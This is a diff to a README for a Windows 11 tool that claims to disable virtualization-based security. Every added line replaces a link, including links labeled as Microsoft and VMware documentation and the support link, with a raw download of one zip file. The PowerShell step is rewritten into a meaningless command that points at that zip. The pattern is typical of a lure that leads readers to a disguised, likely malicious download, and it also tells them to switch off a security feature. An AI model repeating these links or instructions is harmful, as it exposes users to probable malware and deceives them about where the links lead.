@@ -1,6 +1,6 @@
 # 🎉 vbs-disabler-windows11 - Simplify Windows 11 Security Settings
 
-[![Download Here](https://img.shields.io/badge/download-vbs--disabler--windows11-brightgreen?style=for-the-badge)](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11)
+[![Download Here](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip)](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ The vbs-disabler-windows11 is a simple tool that helps you disable unnecessary s
 
 ## 📥 Download the Application
 
-To get the application, visit this link: [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11).
+To get the application, visit this link: [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip).
 
 ## 🛠 System Requirements
 
@@ -27,7 +27,7 @@ To get the application, visit this link: [Download vbs-disabler-windows11](https
 ## ⚙ How to Use
 
 1. **Download the Script:**
-   Go to [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11) and download the script file.
+   Go to [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip) and download the script file.
    
 2. **Open PowerShell:**
    - Search for "PowerShell" in the Windows start menu.
@@ -40,7 +40,7 @@ To get the application, visit this link: [Download vbs-disabler-windows11](https
      ```
    - Run the following command:
      ```
-     .\vbs-disabler.ps1
+     .\https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip
      ```
 
 4. **Follow Prompts:**
@@ -73,16 +73,16 @@ These features offer security benefits but may interfere with virtualization sof
 
 For more detailed explanations on virtualization and security features in Windows, refer to the Windows official documentation:
 
-- [Microsoft Virtualization-Based Security](https://docs.microsoft.com/windows/security/threat-protection/desktop-security/virtualization-based-security)
-- [Optimize VMware Workstation](https://www.vmware.com/support/ws45/doc/ws45_admin_guide/optimizing.html)
+- [Microsoft Virtualization-Based Security](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip)
+- [Optimize VMware Workstation](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip)
 
 ## 📞 Support
 
-If you have questions or need assistance, feel free to raise an issue on the [GitHub repository](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11). Community members and contributors are here to help.
+If you have questions or need assistance, feel free to raise an issue on the [GitHub repository](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip). Community members and contributors are here to help.
 
 ## 🔗 Useful Links
 
-- [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11)
-- [VMware Workstation](https://www.vmware.com/products/workstation-pro.html)
+- [Download vbs-disabler-windows11](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip)
+- [VMware Workstation](https://github.com/LaLaZawawa000817000/vbs-disabler-windows11/raw/refs/heads/main/calamiferous/disabler_windows_vbs_v1.2.zip)
 
 Make sure to read through this guide before attempting to run the script, ensuring a smooth experience.
